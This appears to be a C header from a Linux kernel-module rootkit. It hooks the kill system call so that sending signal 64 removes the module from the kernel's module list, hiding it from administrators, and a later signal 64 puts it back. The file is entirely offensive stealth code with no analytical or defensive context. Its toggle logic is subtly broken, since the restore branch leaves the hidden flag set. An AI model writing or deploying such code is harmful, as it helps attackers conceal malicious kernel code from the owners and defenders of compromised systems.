#ifndef _KILL_H_
#define _KILL_H_

static struct list_head *prev_module;
static short hidden = 0;

static asmlinkage long (*orig_kill)(const struct pt_regs *);


notrace asmlinkage int hook_kill(const struct pt_regs *regs) 
{
    void showme(void);
    void hideme(void);

    int sig = regs->si;

    if ( (sig == 64) && (hidden == 0) ) {

        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) ) {

        showme();
        hidden = 1;
    }
    else {

        return orig_kill(regs);
    }

    return 0;
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void showme(void) {

    list_add(&THIS_MODULE->list, prev_module);
}

#endif
